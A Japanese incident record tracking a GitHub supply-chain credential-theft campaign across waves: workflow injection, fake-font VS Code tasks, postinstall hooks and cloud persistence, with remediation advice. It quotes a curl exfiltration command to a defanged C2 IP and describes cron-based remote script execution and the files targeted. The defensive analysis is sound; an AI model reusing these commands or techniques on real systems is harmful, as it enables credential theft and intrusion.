従来の波との違いは、狙う鍵の範囲である。 2025年9月に GitGuardian が記録した GhostAction は GitHub Actions のシークレットだけを取った。本変種はその機能を保ったまま、fetch-depth: 0 で全ブランチ・全タグを取得し、作業ツリーと git log -p --all の全履歴に対して13種の資格情報パターンを走らせる機能を追加した——AWS のアクセスキー ID／シークレットアクセスキー／STS セッショントークン、Anthropic（sk-ant-）・OpenAI（sk-proj-）・OpenRouter の API キー、GitHub／GitLab の個人アクセストークン、Google/Firebase/GCP の API キー、Slack トークン、SendGrid の API キー。

最も作り込まれているのは AWS 向けの2つの前後文抽出である。 AKIA／ASIA で始まるアクセスキー ID の前後2行を作業ツリーと履歴の両方から切り出す。キー ID 単体では認証できないため、1〜2行離れた場所にある40文字のシークレットアクセスキーごと鍵対として回収する設計である。

影響はその後拡大した。 Socket は公開後の追記で、2026年10月7日以降に500超の GitHub アカウントが同じ悪性ワークフローを数万リポジトリへコミットしていると述べている（侵害された貢献者経由で組織所有のリポジトリにも到達）。

本記録が構造上の中心として評価したのは2点である。 ①「履歴に一度でも入れた鍵」が攻撃対象として明確に組み込まれた（本記録の判断）—— 既定ブランチから消したつもりの鍵が、到達可能なブランチやタグから回収される。Actions シークレットの入れ替えでは、この露出は何も解消しない。 ②偵察を要する半分と、要しない半分が1つのファイルに同居している（本記録の指摘）—— 履歴掃きは偵察を要さないため、同一の静的ファイルを346リポジトリへ短時間で展開できた。

①Actions シークレットが漏えいした可能性がある場合

対応 内容
入れ替え ワークフローが参照していたシークレットをすべて入れ替える。PAT は失効させる
配布基盤の確認 PyPI・crates.io で、露出期間中およびその後に出た想定外のバージョンを確認し、自前のビルド成果物と照合する

②リポジトリ内に資格情報が残っていた可能性がある場合

対応 内容

③共通

  • 送信ログ（セルフホストランナーの範囲を含む）で C2 への通信を探し、遮断する。
  • secret scanning と push protection を有効化し、外部共同作業者によるワークフロー実行には承認を求める。
  • フォークの管理者は、影響を受けた名前空間から取得したフォークでActions を有効にする前に、該当ワークフローの有無を確認する。

本記録が初版に書いた数は、すべて注入側の数だった

初版の数値は 346リポジトリ（10月8日のバースト）と数万リポジトリ・500超のアカウント（Socket の追記）でした。どちらも「悪性ファイルが置かれた数」であって、「鍵が盗まれた数」ではありません（本記録の明記）。GitGuardian の内訳は、その区別を初めて数で裏付けたものです。

実務上の意味は1つに絞れます（本記録の整理）—— この種のキャンペーンの規模を自組織の報告書や経営への説明に引くとき、注入件数を被害件数として書くと、実態より2〜3桁大きい数になります。書くなら「露出した可能性のあるリポジトリ数」と「窃取が確認された件数」を別の行に分けることです。

ただし、安心する数字ではありません——理由は3つ

①26件は下限です。 GitGuardian が観測できたのは公開履歴の範囲で、非公開リポジトリや観測外の run は含まれていません（本記録の留保）。

②清掃が進んでいません。

「2026年10月5日までに、観測された公開履歴において実効的に清掃されていたのは124リポジトリ（16%）だけだった。」（原文英語。本記録の訳。出典2）

772のうち648リポジトリには、まだファイルが残っているということです。Socket が指摘したとおり、Actions が有効なら、以後の push だけで収集が走る余地が残ります——つまりこの26件は確定値ではなく、増えうる途中の数です（本記録の評価）。なお「実効的に清掃された」の基準は公表されていません〈未確定事項に記録〉。

③10月のバーストは桁が1つ上です。 GitGuardian の集計では、約1,900の侵害アカウントから約3,000の利用者・組織の3万超リポジトリへ、3,174件のシークレットを取りに行っています（T11）。8〜9月の波（772リポジトリ）の約40倍です。8〜9月の「窃取26件」という比率がこのまま当てはまる保証はありません（本記録の明記）—— GitHub の承認待ちによる抑制がどこまで効くかは、フォークの同期や Actions の有効化の状況に依存します。

盗んだ配布権限を使って悪性パッケージが公開された事例は、Socket（10月9日）も GitGuardian・보안뉴스（10月13日）も確認していません（出典1・2・3）。これは「波及しない」という結論ではなく、「2026年10月13日時点で見つかっていない」という状態です（本記録の明記）—— PyPI・npm・crates.io・Docker Hub の公開権限は、盗まれてから使われるまでに時間を置ける種類の資格情報です。

【10月20日】第2段はフォントに化けた38行の Node.js——VS Code でフォルダを開くと走る原因・手口

2026年10月14〜15日、同じキャンペーンの第2段が94リポジトリ（所有者66）に置かれました（OpenSourceMalware の一次レポート。原文英語「Stage 2 lands in 94 repositories」）。狙いが変わっています——第1段は CI で動いてGitHub Actions のシークレットと git 履歴の鍵を掃きましたが、第2段は開発者の端末そのものを狙います。

置かれるのは2つのファイルです。

  • .vscode/tasks.json — ラベルは eslint-check。runOn が folderOpen のため、VS Code でフォルダを開くだけで実行を要求します。 hide と reveal の設定で目立たないようにしてあります。解析できた79件すべてでバイト単位で同一でした。
  • public/fonts/fa-solid-400.woff2 — Font Awesome のフォント資源に見えますが、難読化されていない約38行の Node.js スクリプトです。 Node は拡張子を問わず実行するので動きます。

実行の条件は2つあります（レポートの記述）。ワークスペースが信頼されていることと、VS Code の自動タスクが許可されていること。 したがって「クローンした」「閲覧した」だけでは実行の確認になりません——94という数は「置かれた数」であって「被害の数」ではありません（本記録の明記。初版の【10月14日】の節と同じ注意です）。

集めるものは次のとおりです。ユーザー名・ホスト名・リポジトリ名を含むレポートを作り、資格情報ファイル（AWS・PyPI・npm・Git・netrc・Claude・Gemini・Kubernetes）と SSH 秘密鍵（id_rsa・id_ed25519）を直接読み、home 配下を grep でトークン探索し、一部の環境変数（AWS_・ANTHROPIC・OPENAI・HF_TOKEN・GITHUB_TOKEN など）を集めて、単一 IP の 8080 番へ平文 HTTP で POST します。 ブラウザと暗号資産ウォレットは対象外です（レポートの記述）。

レポートは収集ロジックに2つの誤りがあると指摘しています。環境変数のフィルタが ^ で始まるため多くの API キー変数が漏れること、grep がタイムアウトすると結果が捨てられること。ただし資格情報ファイルと SSH 鍵は直接読まれるため、この誤りで実害が大きく減るとは書かれていません（本記録の確認）。

第2段には CI 側のワークフローも付いています ——lint.yml などの名前で、第1段より多くのパターンで秘密情報を探します。

フォントファイルを消しても cron は止まらない——残るのは遠隔コード実行の能力対策・注意喚起

本記録がこの続報で最も重いと見る点です（本記録の評価）。

第2段の4つ目の処理は、cron を登録します。 5分ごとに http://<IP>:8080/c2/<ホスト名> から取得したスクリプトを bash に渡します（cron のコメントは #ghc2）。レポートは「フォントファイルを消しても cron の仕事は消えない」と述べています（原文英語「deleting the font file doesn't cancel the cron job.」）。

つまり、盗まれたのは資格情報だけではありません。 残ったのは、攻撃者が任意のコードを5分おきに送り込める状態です（本記録の整理）。第3段の内容はレポートの作成者も取得できていません〈未確定〉。

確認の手順を4つ書きます（本記録の整理。レポートの記述を自組織での点検に落としたものです）。

  1. .vscode/tasks.json が意図せず増えていないか。ラベル eslint-check、runOn が folderOpen、hide や reveal の指定が目印です
  2. public/fonts/fa-solid-400.woff2 のようなフォント資源がテキスト（JavaScript）になっていないか。拡張子ではなく中身を見ること
  3. crontab -l にコメント #ghc2 を持つ行が無いか。 ファイルを消しただけでは残ります。 Windows では crontab が無いため cron は入りません
  4. VS Code のワークスペースの信頼設定と自動タスクの許可を、外部から取得したリポジトリを開く端末で見直す

本記録の主張を1つ置きます。 「クローンしただけなら安全」という読みは危険です。実行の条件（信頼済みのワークスペース＋自動タスクの許可）は、開発者が日常的に満たしている設定です。資格情報の回転（ローテーション）だけでは終わりません ——cron を消し、端末を疑い、そこから使われた鍵を全部作り直す必要があります。

なお、本記録が挙げた IoC（IP・パス・ファイル名・マーカー）の悪性は検証していません（照合先のテレメトリを持たないため。本DBの方針）。

手口の骨組みは PolinRider の模倣——ただし共有 IoC は無く、GhostAction との結びつきは IP の一致による帰属

帰属についてのレポートの記述と、本記録の留保です。

発見の経緯: Jamf Threat Labs の Thijs Xhaflaire 氏がPolinRider の感染を探す定期ハントの中でこの群を見つけ、OpenSourceMalware へ提出しました。手口そのもの（VS Code の自動タスク＋偽フォント）は2026年1月に同氏が初めて観測したものとされています。

PolinRider との関係（レポートの判断）:

  • 骨組みはコピー — 同じラベル、同じトリガー、同じ「フォントに化けさせる」手口
  • 中身は逆 — PolinRider は難読化コードとブロックチェーンのデッドドロップを使い、ブラウザと暗号資産ウォレットを狙う。第2段は平文の JavaScript、直接の IP、cron を使い、クラウド・レジストリ・AI ツールの資格情報を狙う
  • 共有 IoC は見つからない — レポートはこれを根拠に「PolinRider の拡張」ではなく copycat（模倣） と判断
  • 例外 — bagisto-dhs では Tailwind の設定ファイルにPolinRider 式のローダーが見つかったが、別の時期・別の手口であり直接の共通指標は無いとされる

GhostAction との結びつき: 送出先 IP（193[.]32[.]204[.]199）が第1段と一致します。 レポートはこの IP を「最後まで変わらなかった指標」として挙げ、結びつけの根拠は主にこの一致と時期の重なりです〈齟齬8〉。実行者が公開記事を読んでいたかは確定できないとしています。

本記録の扱い（本記録の判断）: 第2段を本キャンペーンの続報として記録しますが、同一の実行者であると断定しません。 IP の再利用は強い指標ですが、インフラの共用・転売もありえます。フィッシングキット（my-github.com・2026年10月9日登録・要求スコープ repo・workflow・read:org）も、94リポジトリには直接結びつけられていません ——「どうやってアカウントを奪ったか」は、初版の時点から変わらず確定していません。

【11月12日】61,764は「試した数」で1,806が「走った数」——初めて同じ観測者が両方を出した被害規模・影響範囲

本記録は10月14日の追記以来、 「注入件数は露出の上限であって被害の量ではない」と書いてきた （本記録の整理）。 第3の波では、同じ観測者が同じ期間について 両方の数を並べて出した（出典6）〈重要〉。

4,837の侵害アカウントが61,764リポジトリへ 「docs: dependency audit notes」という題のプルリクエストを wfx-docs ブランチから出した（出典6）—— これは攻撃ではなく偵察である。 そのアカウントがそのリポジトリへ書き込めるかを確かめる操作で、 PR が通るかどうかで判定している。

ペイロードが実際に走り、資格情報が持ち出されたのは 少なくとも1,806リポジトリである（出典6）。 Aikido は「この数は影響を過小に表しているかもしれない」と 注記している。

したがって読み方は3層になる（本記録の整理）〈重要〉—— ①61,764＝攻撃者が書き込み権限を試した先の数。 見出しの「数万リポジトリ」はこれである。 ②1,806＝ペイロードが走ったことが観測できた数。下限である。 ③不明＝持ち出された資格情報の件数と、 それが実際に使われたかどうか。 ①と②の間にある差は、権限が無かった・実行条件が合わなかった・ 観測できなかった、のいずれかであり、分けて示されていない。

鍵を回しても残る——クラウド側に信頼ポリシーと連携資格情報という足場が作られた原因・手口

これが第3の波で最も重い変化である（本記録の評価）〈重要〉。

第1段（10月）は、ランナーから見えるシークレットと git 履歴に残る鍵を掃き出して送るだけだった ——対応は「資格情報の回転」で閉じた。 第2段（偽フォント）は開発者の端末に cron を残した ——対応に「端末の掃除」が加わった。

第3の波は、盗んだ資格情報でクラウドへ踏み込み、 そこに戻ってこられる構造を作る（出典6）—— ①ランナー上のシークレット・クラウド資格情報・トークンを集める ②AWS・GCP・Azure・Vault・Kubernetes へ踏み込む ③AWS のロールの信頼ポリシーを "Principal": {"AWS": "*"} に書き換える ④Azure のアプリに wfx-ci-… という名の連携資格情報 （federated credentials）を足す ⑤偽の success ステータスチェックを置く。

③と④が意味するのは、資格情報を回しても足場が残るということである （本記録の評価）〈重要〉—— 信頼ポリシーが "AWS": "*" になったロールは、 どのAWSアカウントからでも引き受けられる。 Azure の連携資格情報は、 外部の身元（OIDC の発行者と主体）でトークンを取れる仕組みで、 パスワードや鍵を持たない。 したがって「漏れた鍵をすべて無効化した」だけでは閉じない。

対応はこの順で確認する（出典6 の推奨をもとに本記録が整理）—— ①ペイロードが走ったリポジトリでは、 そのワークフローが触れられるすべてのシークレットと クラウドロールが侵害されたものとして扱う ②AWS のロールの信頼ポリシーに "AWS": "*" が無いかを確認する ③Azure のアプリ登録に wfx-ci-… という名の連携資格情報が 無いかを確認する ④①の回転は③の掃除より前に終わらせても意味が無い ——先に足場を消す。

本記録が初報から書いてきた 「対応は2系統——どちらか片方を終えて『対応済み』としないこと」は、 いま3系統になった（本記録の評価）—— Actions のシークレット／git 履歴の鍵／クラウド側の足場。

実行ログは約1分で消える——「痕跡が無い」を安全の根拠にしてはいけない評価・解釈

攻撃者は、成果物を送った後に自らの変更を元に戻し、 ワークフローの実行とそのログを約1分以内に削除する （出典6）〈重要〉。

Aikido は読者に向けてこう書いている（原文英語。本記録が訳した） ——「wfx-loot の成果物や wfx- のキャッシュの項目が 見当たらないことは、データが取られていない証明にはならない」。

第1段（10月）との差を押さえておく（本記録の整理）—— 第1段は送出のコマンドに || true を付けて、 送出が失敗しても実行が成功扱いになるようにしていた （実行履歴に失敗が出ない）。 第3の波は、実行そのものを履歴から消す。 さらに偽の success ステータスチェックを置くので、 ブランチ保護の表示上は何も起きていないように見える。

したがって自社での調査は「無いものを探す」形にならざるを得ない （本記録の評価）〈重要〉—— 出典6 が挙げる手がかりは、 ①wfx-docs ブランチと「docs: dependency audit notes」という題の プルリクエストの痕跡 ②コミットメッセージ（ci: refresh build cache・ci: restore・ chore: add ci helper・ci: cleanup・ chore: add dependency audit workflow） ③ブランチ名（chore/[a-z0-9]{8}・ci-check-[0-9]{4}） ④ワークフロー実行番号の飛び、である。 ④が本質的である—— 実行は削除されても番号は欠番として残る。

運用への含意（本記録の評価）—— ワークフロー実行の履歴を GitHub の外へ （監査ログの転送や定期的な取得で）持っていない組織は、 この種の事案で「走ったかどうか」を自力で判定できない。 監査ログの保全は、攻撃者が消せない場所に置いてはじめて意味を持つ。

②なぜそうなりうるのかも、押さえておく価値がある（本記録の整理）。攻撃者が侵害した公開権限を握ったままなら、「修正版」として出される版も攻撃者が出せる。本件で本記録が初報から追ってきたのは、まさにその経路である—— 侵害アカウントのうち少なくとも50が npm・Go・Packagist・PyPI・crates へパッケージを公開する立場にある（出典6）。公開権限が回収されない限り、同じ名前空間から何版でも出せる。

③ただし、本記録は「3.14.4 に悪性コードが残っている」とは書かない。判定の根拠が示されていないためである〈未確定〉——悪性コードが残っているのか、同じ成果物が再公開されたのか、自動判定が版をまたいで引きずられているだけなのかは分からない。分からないまま採れる判断が「判定が取り消されるまで上げない」である。

この更新で新しいのは、8,926 の内側にある 829 のほうである〈重要〉。829以上のリポジトリは、ワークフローではなくpackage.json に postinstall フックを足された形である（出典9）。コミットの題名は chore: add ci helper、足されたフックが呼ぶのは .ci-xxxxxx.sh。

これは経路が違う（本記録の評価）。ワークフロー注入は GitHub Actions が有効であることを前提にしていた。postinstall は前提にしていない。 開発者が手元で npm install を走らせた時点で動く。

したがって「自社は Actions を使っていない」「Actions は止めてある」は、この変種には効かない〈重要〉。本記録が第2段（.vscode/tasks.json と偽フォント）で書いたのと同じ構図である—— 攻撃者は、CI の中から、開発者の端末のほうへ出てきている。

効く対策は2つである（出典9 の推奨。本記録が整理した）——

  • npm ci --ignore-scripts を既定にする。インストール時スクリプトを実行しない。必要なパッケージだけを明示的に例外にする。
  • .github/workflows/** への直接 push を禁止し、コードオーナーの承認を必須にする。既定の GITHUB_TOKEN は読み取り専用にする。

  • AWS のアクセスキー ID だけでなく「前後2行」が狙われている。鍵対で考える
    **Socket は2つの前後文抽出を「the most deliberate part of the addition」（追加部分のうち最も意図的な箇所）と評している** （原文英語。本記録の訳）。 **理由は明快である**—— **「An AKIA or ASIA value is only a key identifier; it authenticates nothing on its own」（AKIA や ASIA の値は鍵の識別子にすぎず、 それ自体では何も認証しない）。** **40文字のシークレットアクセスキーは、実務上 `.env`・ AWS の認証情報ファイル・Terraform の変数ファイル・CI の設定ブロックで 1〜2行離れた場所にある**（Socket の分析）—— **前後2行を取ることで、孤立した識別子ではなく使える鍵対が復元される**
    取るべき行動 **AWS のアクセスキーを常設せず、OIDC による一時的な認証に切り替える。** **切り替えられない場合は、キー ID とシークレットを 同じファイル・同じ近傍に置かない**（ただし本記録の評価では、 これは時間稼ぎにすぎない。履歴に両方が入っていれば同じである）。 **履歴に AWS キーが見つかった場合は、CloudTrail で露出期間中と以後の 不審な IAM ユーザー・アクセスキー・リージョンを確認する**（Socket の推奨）
  • C2 は単一の固定 IP への平文 POST である。送信ログを遡って「渡ったか」を確定する
    **送出は `curl -s -m 20 -X POST --data-binary "$full" "hxxp://193.32.204[.]199/?c=monami" || true` の1行である** （Socket が示した全文。defang 表記は Socket のもの）。 **本文には `REPO=`・`AKIA_CTX_START`・`AKIA_CTX_END` という目印が含まれる** （Socket の IoC）。 **`|| true` により、送信が失敗してもジョブは成功のまま終わる** （本記録の読み）—— **実行履歴上では失敗として目立たない。** **GitHub ホストのランナーからの送信は利用者側のログに残らない** （本記録の指摘）
    取るべき行動 **C2 の IP（193.32.204.199）を遮断リストに登録し、 過去の通信ログを遡って検索する**—— **遮断は当座の措置、遡っての検索が「渡ったか」を確定する** （本記録の判断）。 **セルフホストランナーの送信先を許可リストで制限する。** **GitHub ホストのランナーを使っている場合は、 Actions の実行履歴を確認し、完了した実行は情報流出とみなす** （Socket の推奨）—— **`|| true` があるため「成功」は送信の成否を保証しないが、 流出したものとして扱う判断が正しい**
  • 「2つの露出は別物」として対応を分ける。片方だけ直して終わらせない
    **Socket の結論は明確である**—— **「Rotating Actions secrets does nothing for a committed-credential exposure, and scanning the working tree does nothing for an Actions-secret exposure」（Actions シークレットの入れ替えは コミットされた資格情報の露出に何の効果もなく、 作業ツリーの走査は Actions シークレットの露出に何の効果もない）** （原文英語。本記録の訳）。 **本記録の評価では、本件の最大の落とし穴はここである** （本記録の判断）—— **1つのファイルが2種類の鍵を1回の POST で持ち出すため、 対応も2種類必要になる**
    取るべき行動 **対応を2つの作業に分けて管理する。** **①Actions シークレット**—— ワークフローが参照していたシークレットをすべて入れ替え、 PAT は失効させる。配布基盤で想定外の版が出ていないかを確認する。 **②履歴にコミットされた資格情報**—— `git log -p --all` と到達不能オブジェクトを含めて走査し、 13種すべてを入れ替える。 **どちらを終えたかをチェックリストで追う**—— **「対応済み」の報告が片方だけを指していないか確かめる**（本記録の評価）
